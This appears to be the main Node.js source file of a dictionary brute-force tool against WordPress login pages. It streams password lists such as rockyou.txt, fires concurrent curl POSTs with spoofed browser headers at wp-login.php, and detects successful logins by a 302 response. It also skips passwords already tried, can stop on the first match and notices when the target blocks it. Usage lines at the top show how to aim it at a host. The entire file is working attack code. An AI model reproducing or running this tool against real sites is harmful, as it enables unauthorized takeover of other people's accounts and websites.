#!/usr/bin/env node
// node ./ -d ./wplogin/~dicts/rockyou.txt -h 'http://www.example.com' -p '/blog/wp-login.php' -v -s30 -t20 -r
// node ./ -h 'http://www.example.com' -u admin -v -s10 -r
// node ./ -d ./~dicts  -v -s10 -t1 -r -h 'localhost:3000/5000'

var fs = require('fs')
,split = require('split')
,path = require('path')
,through = require('through')
,sext = require('sext')
,argv = require('minimist')(process.argv.slice(2))
,ut = require('./ut')
,logger = require('./logger')
,db = require('./level')
,config = require('./config')
,matchKey = 'Match!'
,verbose = !!argv.v
,intervalSeconds = argv.s ? +argv.s : null
,host = argv.h || ''
,loginPath = argv.p || '/wp-login.php'
,user = encodeURIComponent(argv.u || 'admin')
,quitOnFind = !!argv.r
,logDir = config.logDir || __dirname+'/logs/'
,maxCmdThreads = argv.t ? +argv.t : config.maxCmdThreads
,dictFile = path.normalize(argv.d || __dirname+'/dict.example')
,dictDir
,previouslyChecked = {
	_: {}
	,f: {}
}
,checkedThisProcess = {}
,statsInterval = null
,stats = {
	passesRead: 0
	,attempts: 0
	,attemptsCompleted: 0
	,attemptErrors: 0
	,skipped: 0
	,dups: 0
	,timeStart: null
	,timeEnd: null
	,matches: []
}
,configDisplay = ['host: '+host, 'loginPath: '+loginPath, 'user: '+user, 'dictFile: '+dictFile, 'verbose: '+verbose, 'intervalSeconds: '+intervalSeconds, 'logDir: '+logDir, 'quitOnFind: '+quitOnFind, 'maxCmdThreads: '+maxCmdThreads, 'config: '+JSON.stringify(config)]
;
console.log(configDisplay.join('\n'),'\n');

stats.timeStart = new Date;
startStatsInterval(intervalSeconds);
logger.create(logDir, process.argv.join(' '), ut.prettyTime(stats.timeStart), configDisplay.join('\n'));
//handleProcessErrors();


fs.stat(dictFile,function(err,stat){
	if (err)
		return console.log('Error reading dict', err);
	var files;
	if (stat.isDirectory()){
		dictDir = dictFile;
		try {
			files = fs.readdirSync(dictFile);
			files.forEach(function(file,i){
				files[i] = dictDir+'/'+file;
			});
		} catch (e) {
			return console.log('Error reading dir', e);
		}
	} else if (stat.isFile()) {
		dictDir = path.dirname(dictFile);
		files = [dictFile];
	} else {
		return console.log('Dict path is not a file or directory');
	}
	db.getResultsForHostUser(host, user, function(err,data){
		if (err)
			return console.log('Error getting saved results',err);
		data.forEach(function(v){
			if (!previouslyChecked._[v.file]) {
				previouslyChecked._[v.file] = {};
				previouslyChecked.f[v.file] = {};
			}
			previouslyChecked._[v.file][v.pass] = previouslyChecked.f[v.file][v.pass] = v.pass;
		});
		displayPrevChecked();
		delete data;
		through(checkDicts).on('attemptReceived',function(err, match){
			if (!match)
				return !err || console.log('Attempt Error', err);
			saveAndEnd(false,match);
		}).on('fileRead',function(err,data){
			if (err)
				console.log('File Read Error', err);
		}).on('end',function(err,matches){
			saveAndEnd(err,matches[matches.length-1],true);
		}).write(files);
	});
});

function saveAndEnd(err,match,end,postMsg){
	if (!match) {
		next();
	} else {
		db.saveResult(host, match.user, match.file, match.pass, match.result?'1':'0', function(err,data){
			if (err)
				console.log('Error saving result', err);
			next();
		});
	}
	function next(){
		if (end || (match && match.result && quitOnFind))
			showResults(err,postMsg);
	}
}

function handleProcessErrors(){
	process.on('SIGINT',showResults);
	process.on('uncaughtException',showResults);
}

function prettifyStats(){
	var cpy = sext({},stats);
	if (cpy.timeStart)
		cpy.timeStart = ut.prettyTime(cpy.timeStart);
	if (cpy.timeEnd)
		cpy.timeEnd = ut.prettyTime(cpy.timeEnd);
	return '\n\n----------------------------\n\n'
		+ ut.prettyTime()+'\n\n'
		+ JSON.stringify(cpy)+'\n\n'
		+ (stats.attemptErrors
			? 'Retry the '+stats.attemptErrors+' failed attempts by running:\n'
				+ makeReRunFailedAttemptsCmd()
			: '\n')
		+ '----------------------------\n\n'
	;
}

function makeReRunFailedAttemptsCmd(){
	var logPath = logger.getPath('failed');
	if (!logPath)
		return null;
	return process.argv.join(' ').replace(dictFile,logPath);
}

function showResults(err,postMsg){
	stats.timeEnd = new Date;
	stopStatsInterval();
	err
		? console.log('\n------------ Error! ------------\n',err)
		: console.log('\n------------ El Fin ------------\n')
	;
	if (err) {
		if (err.message && err.name && err.stack)
				throw err;
		console.log('ERR',err);
	}
	var pretty = prettifyStats() + postMsg ? '\n\n'+postMsg : '';
	console.log(pretty);
	logger.update(pretty,function(){
		process.kill();
	});
}

function startStatsInterval(secs){
	var ms = secs * 1000;
	stopStatsInterval();
	statsInterval = setTimeout(function(){
		var pretty = prettifyStats();
		if (verbose)
			console.log(pretty);
		logger.update(pretty);
		startStatsInterval(secs);
	},ms);
}

function stopStatsInterval(){
	if (statsInterval === null)
		return;
	clearTimeout(statsInterval);
	statsInterval = null;
}

function checkDicts(files,cb){
	var z = this
	,filesFinished = 0
	,attempts = 0
	,attemptsReceived = 0
	,activeCmds = 0
	,streams = []
	,cmdQueue = []
	,matches = []
	;
	files.forEach(function(file,fileIndex){
		streams[fileIndex] = fs.createReadStream(file).pipe(split()).on('data',function(pass){
			++stats.passesRead;
			if (previouslyChecked._[pass]) {
				++stats.skipped;
				return z.emit('attemptReceived',false);
			}
			if (checkedThisProcess[pass]) {
				++stats.dups;
				return z.emit('attemptReceived',false);
			}
			checkedThisProcess[pass] = true;
			++stats.attempts;
			++attempts;
			queueCmd({user:user,pass:pass,file:file});
		}).on('error',fileFinished).on('close',fileFinished);
		function fileFinished(err){
			++filesFinished;
			z.emit('fileRead',err,file);
			if (attemptsReceived == attempts && filesFinished == files.length)
				return z.emit('end',false,matches);
		}
		function queueCmd(cmd){
			if (activeCmds < maxCmdThreads)
				return runCmd(cmd);
			cmdQueue.push(cmd);
			if (cmdQueue.length > config.maxLinesReadAhead && !streams[0].paused) {
				//console.log('PAUSED');
				streams.forEach(function(stream){
					stream.pause();
				});
			}	
		}
		function runCmd(cmd){
			++activeCmds;
			checkAuth(cmd, function(err,match){
				if (!err) {
					++stats.attemptsCompleted;
					if (match.result) {
						matches.push(match);
						stats.matches.push(match);
					}
				} else {
					++stats.attemptErrors;
					logger.addErroredAttempt(match.pass);
				}
				if (streams[0].paused) {
					//console.log('RESUME');
					streams.forEach(function(stream){
						stream.resume();
					});
				}
				++attemptsReceived;
				z.emit('attemptReceived',err,match);
				if (attemptsReceived == attempts && filesFinished == files.length)
					z.emit('end',false,matches);
				--activeCmds;
				if (cmdQueue.length)
					runCmd(cmdQueue.shift());
			});
		}
	});
}

function checkAuth(entry,cb){
	var cmd = config.curl
	,args = ['-v',host+loginPath
	,'-H',"Cookie: wordpress_test_cookie=WP+Cookie+check"
	,'-H',"Origin: "+host
	,'-H',"Accept-Encoding: gzip,deflate,sdch'"
	,'-H',"Accept-Language: en-US,en;q=0.8"
	,'-H',"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
	,'-H',"Content-Type: application/x-www-form-urlencoded"
	,'-H',"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
	,'-H',"Cache-Control: max-age=0"
	,'-H',"Referer: "+host+loginPath
	,'-H',"Connection: keep-alive"
	,'--data',"log="+entry.user+"&pwd="+encodeURIComponent(entry.pass)+"&wp-submit=Log+In&redirect_to="+encodeURIComponent(host+loginPath.replace(/(wp-login\.php)|(wp-login\/?)/,'wp-admin/'))+"&testcookie=1"
	,'--compressed'
	];
	//console.log('curl "'+args.join('" "')+'"');
	// can make faster by killing the process after stdErr is done
	ut.spawn(cmd,args,function(err,stdOut,stdErr){
		// todo: need a stricter check to make sure page loaded
		if (stdOut.length < 500 || stdErr.indexOf('403 Forbidden') != -1)
			return saveAndEnd('Blocked', null, true, '\n\n'+stdErr+'\n\n\n'+stdOut+'\n\n\nWe\'ve been blocked :(\n\n');
		if (!err && stdErr.indexOf('302 Found') != -1) {
			entry.result = true;
			if (verbose) console.log(matchKey,'  ',entry);
		}
		cb(err,entry,stdOut,stdErr);
	});
}


function displayPrevChecked(){
	console.log('Total previously checked:\n',Object.keys(previouslyChecked._).length,'\n');
	//console.log('\n\npreviouslyChecked.f:\n',previouslyChecked,'\n\n');
	Object.keys(previouslyChecked.f).forEach(function(k){
		console.log('"'+k+'": '+Object.keys(previouslyChecked.f[k]).length);
	});
}

